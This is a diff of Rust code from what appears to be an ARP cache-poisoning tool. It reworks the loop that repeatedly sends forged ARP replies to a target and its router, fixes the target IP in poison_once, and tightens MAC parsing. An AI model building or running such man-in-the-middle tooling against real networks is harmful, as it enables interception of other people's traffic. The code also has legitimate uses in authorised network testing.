@@ -122,35 +122,23 @@ async fn poisoning_loop(
         }
     };
 
+    let mut interval = tokio::time::interval(Duration::from_millis(config.interval_ms));
+    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);
+
     loop {
         tokio::select! {
             _ = stop_receiver.recv() => {
                 log::info!("Stopping poisoning loop");
                 break;
             }
-            _ = async {
-                if let Err(e) = poison_target(
-                    &mut tx,
-                    &interface,
-                    &target,
-                    &router,
-                    my_mac,
-                ).await {
+            _ = interval.tick() => {
+                if let Err(e) = poison_target(&mut tx, &interface, &target, &router, my_mac).await {
                     log::warn!("Failed to poison target: {}", e);
                 }
-
-                if let Err(e) = poison_router(
-                    &mut tx,
-                    &interface,
-                    &target,
-                    &router,
-                    my_mac,
-                ).await {
+                if let Err(e) = poison_router(&mut tx, &interface, &target, &router, my_mac).await {
                     log::warn!("Failed to poison router: {}", e);
                 }
-
-                tokio::time::sleep(Duration::from_millis(config.interval_ms)).await;
-            } => {}
+            }
         }
     }
 }
@@ -311,6 +299,7 @@ async fn send_restore_packets(
 
 pub async fn poison_once(
     target_mac: &str,
+    target_ip: &str,
     router_ip: &str,
     my_mac: &str,
     interface_name: &str,
@@ -328,6 +317,9 @@ pub async fn poison_once(
     let sender_ip = router_ip
         .parse()
         .map_err(|_| NetworkError::InvalidIpAddress(router_ip.to_string()))?;
+    let target_ip_addr = target_ip
+        .parse()
+        .map_err(|_| NetworkError::InvalidIpAddress(target_ip.to_string()))?;
 
     let packet = build_arp_reply(
         &interface,
@@ -335,7 +327,7 @@ pub async fn poison_once(
         dest_mac,
         sender_ip,
         source_mac,
-        sender_ip,
+        target_ip_addr,
     )?;
 
     tx.send_to(&packet, Some(interface.clone()))
@@ -369,7 +361,7 @@ fn parse_mac_bytes(mac: &str) -> Result<[u8; 6]> {
     let cleaned: String = mac
         .to_lowercase()
         .chars()
-        .filter(|c| c.is_alphanumeric())
+        .filter(|c| c.is_ascii_hexdigit())
         .collect();
 
     if cleaned.len() != 12 {
